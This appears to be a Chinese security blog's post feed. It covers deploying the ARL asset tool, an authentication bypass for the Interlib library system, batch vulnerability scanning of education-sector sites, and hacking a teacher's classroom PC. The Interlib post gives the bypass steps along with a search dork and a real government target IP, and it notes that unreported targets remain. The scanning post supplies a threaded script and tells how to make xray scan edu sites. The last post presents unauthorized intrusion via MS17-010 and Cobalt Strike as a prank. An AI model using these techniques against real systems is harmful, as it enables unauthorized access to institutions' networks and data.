alt="img"></p></li></ol><h5 id="二、下载docker-compose"><a href="#二、下载docker-compose" class="headerlink" title="二、下载docker compose"></a>二、下载docker compose</h5><p>​有docker就少不了docker compose，接着安装docker compose</p><ol><li><p><code>curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py</code></p></li><li><p><code>python3 get-pip.py</code> </p></li><li><p><code>pip3 install  -i https://pypi.tuna.tsinghua.edu.cn/simple docker-compose</code></p></li><li><p>我一般习惯好了看一下版本，一般有信息返回大概率就是能了</p><p><img src="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/img/2.png" alt="image-20240320150648511"></p></li></ol><h5 id="三、部署arl"><a href="#三、部署arl" class="headerlink" title="三、部署arl"></a>三、部署arl</h5><p>安装ARL，下载源码进行部署</p><ol><li><code>mkdir docker_arl</code> </li><li><code>wget -O docker_arl/docker2.3.ziphttps://github.com/TophantTechnology/ARL/releases/download/v2.3/docker.zip</code></li><li><code>cd docker_arl</code></li><li><code>unzip docker2.3.zip</code></li></ol><p><img src="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/img/3.png" alt="image-20240320150840681"></p><ol start="5"><li><p><code>docker-compose up -d</code>，这里会报错，放入谷歌翻译，就是说没找到一个东西，系统放出了一个命令，让我们手动输入创建</p><p><img src="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/img/4.png" alt="image-20240320150954102"></p><p>6.直接输入<code>docker volume create --name=arl_db</code>，回显OK就可以继续了</p></li><li><p><code>sudo service docker start</code> 启动docker</p></li><li><p><code>docker pull tophant/arl</code> 拉取镜像</p></li><li><p><code>reboot</code>之后 <code>docker-compose up -d</code></p><p>​ <img src="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/img/5.png" alt="img"></p></li></ol><p>​</p><p> 10.<code>docker-compose ps</code></p><p>​<img src="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/img/6.png" alt="img"></p><p> 11.可以看到端口是5003，这个时候访问就行了，注意是<strong>https</strong>，如果不能访问就在服务器厂商的安全组里面放行端口，或者关掉防火墙，本地机器就关掉防火墙看看策略</p><p> 默认账号密码： admin&#x2F;arlpass</p><p>​<img src="/2021/07/11/%E7%81%AF%E5%A1%94%E8%B5%84%E4%BA%A7%E7%B3%BB%E7%BB%9F%EF%BC%88ARL%EF%BC%89%E9%83%A8%E7%BD%B2/img/7.png" alt="img"></p><h3 id="end"><a href="#end" class="headerlink" title="end"></a><em>end</em></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考文章资料：</span><br><span class="line">https://github.com/TophantTechnology/ARL</span><br><span class="line">https://developer.aliyun.com/article/110806</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一个在野0day</title>
      <link href="/2021/06/29/%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/"/>
      <url>/2021/06/29/%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/</url>
      
        <content type="html"><![CDATA[<p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h2 id="一个集群管理后台的0day"><a href="#一个集群管理后台的0day" class="headerlink" title="一个集群管理后台的0day"></a>一个集群管理后台的0day</h2><p><strong>截止目前 还没有被披露，看过本博客的有福啦</strong></p><p>注：我已经刷了一部分 交到了src冲了一下排名，不过剩下的资产也不少</p><p>目标：Interlib图书馆集群管理系统</p><p>归属厂商：广州图创计算机软件开发有限公司</p><h3 id="漏洞验证："><a href="#漏洞验证：" class="headerlink" title="漏洞验证："></a>漏洞验证：</h3><p>Google Hacker：interlib3&#x2F;login</p><p>目标：<a href="https://www.ccps.gov.cn/">https://www.ccps.gov.cn/</a> - <strong>中共中央党校(国家行政学院)漏洞我已经提交并修复</strong></p><p>URL：<a href="http://202.108.87.87/interlib3/login">http://202.108.87.87/interlib3/login</a></p><p><img src="/2021/06/29/%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/1.png" alt="zg1.png"></p><p>账号admin，密码随便输入</p><p><img src="/2021/06/29/%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/2.png" alt="zg2.png"></p><p>如下删掉passowrd的值</p><p><img src="/2021/06/29/%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/3.png" alt="zg3.png"></p><p>发送</p><p><img src="/2021/06/29/%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/4.png" alt="zg4.png"></p><p>成功进入后台且为管理员权限，可以看到归属于中共中央党校图书馆</p><p><img src="/2021/06/29/%E4%B8%80%E4%B8%AA%E5%9C%A8%E9%87%8E0day/img/5.png" alt="image-20240322101918781"></p><p>利用这个软件的 大都是高校和政府单位，影响是不小的</p><h2 id="end"><a href="#end" class="headerlink" title="end"></a><em><strong>end</strong></em></h2>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>自动化web漏洞挖掘</title>
      <link href="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
      <url>/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<p><strong>注：微信公众号，csdn，freebuf原创以及本博客，都为我本人。</strong> 转载请邮件告知！</p><p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h2 id="自动化挖漏洞环境搭建"><a href="#自动化挖漏洞环境搭建" class="headerlink" title="自动化挖漏洞环境搭建"></a><strong>自动化挖漏洞环境搭建</strong></h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>​<strong>将目标资产让爬虫工具爬取，再把数据通过burp发送给xray进行漏洞扫描</strong></p><h4 id="使用到的工具："><a href="#使用到的工具：" class="headerlink" title="使用到的工具："></a>使用到的工具：</h4><ul><li>Fofa采集工具，文章用edu系列举例，大家可以根据自己的目标进行选择。</li><li>Rad，浏览器爬取工具，github地址:  <a href="https://github.com/chaitin/rad">https://github.com/chaitin/rad</a></li><li>Chrome浏览器, Rad默认启动的浏览器</li><li>Burp和Xray就不赘述了</li></ul><h4 id="START"><a href="#START" class="headerlink" title="START"></a>START</h4><h5 id="资产采集、"><a href="#资产采集、" class="headerlink" title="资产采集、"></a>资产采集、</h5><p>​由于举例子，就用fofa采集工具去批量采集edu资产来做演示，（<strong>感谢团队F_Dao师傅送的fofa超级会员</strong>）</p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/1.png" alt="1"></p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/2.png" alt="2"></p><p>好多，fofa超级会员真香</p><h5 id="资产处理、"><a href="#资产处理、" class="headerlink" title="资产处理、"></a>资产处理、</h5><p>​因为要使用Rad爬虫，所以我们要对资产进行整理，要使他符合Rad的规则。我们要把上图红框框里的IP加上http:&#x2F;&#x2F;或者https:&#x2F;&#x2F;</p><p>​记得之前学校有考过一个题，就是在excel表中批量给单元格加同样的内容，不过我忘了，这里就用python解决好了</p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/3.png" alt="1623588398_60c5fe2e0b831a09a7e97.png!small?1623588398757"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>) <span class="keyword">as</span> txt:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> txt:</span><br><span class="line">        line = line.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;443&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;https://&quot;</span> + line)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;http://&quot;</span> + line)</span><br></pre></td></tr></table></figure><p>脚本效果</p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/4.png" alt="1623588443_60c5fe5b367de0b9c7c22.png!small?1623588443941"></p><p>上面是资产处理好的效果图，放到Rad目录下，后面的内容会用到。</p><h5 id="流量转发、"><a href="#流量转发、" class="headerlink" title="流量转发、"></a>流量转发、</h5><p>​我们需要给burp添加插件，设置代理</p><p>​被动扫描插件可以更大几率提高挖到的可能性，说不准捡个shiro fastjson这些组件漏洞什么的，这里方便演示随意加两个，当然插件是多多益善</p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/5.png" alt="1623588523_60c5feab8467ab213c71e.png!small?1623588524907"></p><p>​<strong>代理设置为8080，为了是和Rad响应，因为流量是从ray过来的</strong></p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/6.png" alt="1623588644_60c5ff24d23babd9faaae.png!small?1623588645579"></p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/7.png" alt="1623588675_60c5ff43bad40ae501211.png!small?1623588676494"></p><p>​<strong>流量出口设置为7777，因为们要将数据包发给Xray</strong></p><h5 id="漏洞扫描、"><a href="#漏洞扫描、" class="headerlink" title="漏洞扫描、"></a>漏洞扫描、</h5><p>​开启Xray被动扫描，监听7777，（Xray默认不扫edu，需要在config.yaml修改规则）</p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/8.png" alt="1623588798_60c5ffbe9eb943425622f.png!small?1623588799371"></p><h5 id="开始测试、"><a href="#开始测试、" class="headerlink" title="开始测试、"></a>开始测试、</h5><p>​资产准备好了，漏洞扫描器也开始监听了，就差爬虫的数据了，</p><p>​众所周知命令行窗口只能一个一个的输入，步骤一的资产很多，一个一个输入很麻烦也就不是自动化了，这里使用python脚本批量，脚本内容如下：</p><p>​<img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/9.png" alt="1623588963_60c6006313cc81189eae0.png!small?1623588963856"></p><p>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zid</span>(<span class="params">wenjian</span>):</span><br><span class="line">    words = queue.Queue()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(wenjian) <span class="keyword">as</span> txt:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> txt:</span><br><span class="line">            i = i.strip()</span><br><span class="line">            words.put(i)</span><br><span class="line">    <span class="keyword">return</span> words</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zhix</span>(<span class="params">zidian</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> zidian.empty():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i = zidian.get()</span><br><span class="line">            i = i.strip()</span><br><span class="line">            ml = <span class="string">&quot;.\\rad_windows_amd64.exe -t &quot;</span> + i + <span class="string">&quot; --http-proxy 127.0.0.1:8080&quot;</span></span><br><span class="line">            os.system(ml)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    zd = zid(<span class="string">&quot;zc.txt&quot;</span>)</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t = threading.Thread(target=zhix, args=(zd,))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;扫描结束......&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第28行是步骤一整理好资产1.txt的文件名，第30行可以根据需求来修改线程</p><p><img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/10.png" alt="1623589257_60c6018962c7ba312d790.png!small?1623589258951"></p><p><img src="/2021/06/13/%E8%87%AA%E5%8A%A8%E5%8C%96web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/img/11.png" alt="1623589290_60c601aa996afa13af277.png!small?1623589291751"></p><p>等待产出即可</p><p>：)</p><p>学校端午节就给放两天假，想打游戏又要学习还想交漏洞冲冲排名，无奈久坐腰疼，受大佬F_Dao师傅点拨，准备搞一个自动化挖漏洞环境。白天挂机挖漏洞，晚上复制粘贴交平台，芜湖~</p><h2 id="end"><a href="#end" class="headerlink" title="end"></a><em><strong>end</strong></em></h2>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>上课用msf+cs给老师电脑打穿了</title>
      <link href="/2021/05/10/%E4%B8%8A%E8%AF%BE%E7%94%A8msf-cs%E7%BB%99%E8%80%81%E5%B8%88%E7%94%B5%E8%84%91%E6%89%93%E7%A9%BF%E4%BA%86/"/>
      <url>/2021/05/10/%E4%B8%8A%E8%AF%BE%E7%94%A8msf-cs%E7%BB%99%E8%80%81%E5%B8%88%E7%94%B5%E8%84%91%E6%89%93%E7%A9%BF%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<p>上课用msf+cs给老师电脑打穿了</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>说起来这样，上课感觉讲的太无聊，就下了个虚拟机，装好了kali，java环境以及cobaltstrike</p><p>机房什么杀软也没有… 都是windows7的系统，ms17010乱杀，然后把会话传递寄给cobaltstrike，于是乎。。</p><p>突然想小学生心理想恶搞，就出现了下面这一幕</p><p><video width="100%" height="100%" src="https://github.com/Seven1an/blogVideos/raw/main/1.mp4" type="video/mp4" controls loop></video></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
